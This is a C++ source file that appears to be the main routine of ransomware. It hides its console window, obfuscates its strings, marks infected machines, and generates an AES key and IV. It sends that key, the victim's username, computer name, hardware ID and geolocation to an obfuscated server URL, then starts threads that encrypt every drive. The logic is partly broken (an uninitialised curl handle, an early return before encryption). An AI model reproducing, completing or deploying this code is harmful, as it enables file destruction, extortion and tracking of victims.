#include <iostream>
#include <thread>
#include <iomanip>
#include <fstream>
#include <sstream>

#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/filters.h>
#include <cryptopp/hex.h>

#include <curl/curl.h>

#include "headers.h"
#include "systeme.h"
#include "diskEncryptor.h"



int main(void) {
	::ShowWindow(::GetConsoleWindow(), DEBUG);
	::SetConsoleTitleA(AY_OBFUSCATE("ntdll"));

	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}

	Systeme sys;
	std::string username = sys.getUsername();


	std::string path = ("C:\\Users\\") + username + "\\AppData\\Roaming\\check.U3AZqJX";
	std::ifstream hasAlready(path);
	if (hasAlready.is_open()) {
		hasAlready.close();
		return 1;
	}
	std::ofstream checkFile(path);
	if (!checkFile.is_open()) {
		return 1;
	}
	checkFile << CHECK_KEY;
	checkFile.close();

	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::SecByteBlock  iv(CryptoPP::AES::BLOCKSIZE);

	prng.GenerateBlock(key.data(), key.size());
	prng.GenerateBlock(iv.data(), iv.size());

	curl_global_init(CURL_GLOBAL_ALL);
	CURL* curl;
	if (curl) {
		CURLcode res;
		const char* url = AY_OBFUSCATE("http://localhost/server/hdhohzuag?action=add");
		std::map<int, std::string> data = sys.getLocalization();
		std::string ddzdzjd;
		std::string dbhzgdzdgzm;
		CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
		CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
		std::ostringstream ss;
		ss << "uuid=" << sys.getHwId() << "&username=" << sys.getUsername() << "&computername=" << sys.getComputerName() << "&langId=" << sys.getLangId()
			<< "&country=" << data[0] << "&region=" << data[3] << "&city=" << data[2] << "&latlong="  << data[1] << "&osversion=" << sys.getOsVersion() << "&key=" << ddzdzjd << "&iv=" << dbhzgdzdgzm;
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ss.str().c_str());
		res = curl_easy_perform(curl);
		std::cout << res << std::endl;
		
		return 0;
	}
	 	

	std::vector<std::thread> threads;
	std::vector<DiskEncryptor> toEncrypt;
	
	std::vector<std::string> drives = sys.getDrives();

	

	for (auto& drive : drives) {
		DiskEncryptor diskEncryptor(drive, key, iv);
		toEncrypt.push_back(diskEncryptor);
	}
	for (auto& disk : toEncrypt) {
		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
	}
	for (std::thread& t : threads) {
		t.join();
	}
	
	return 0;
}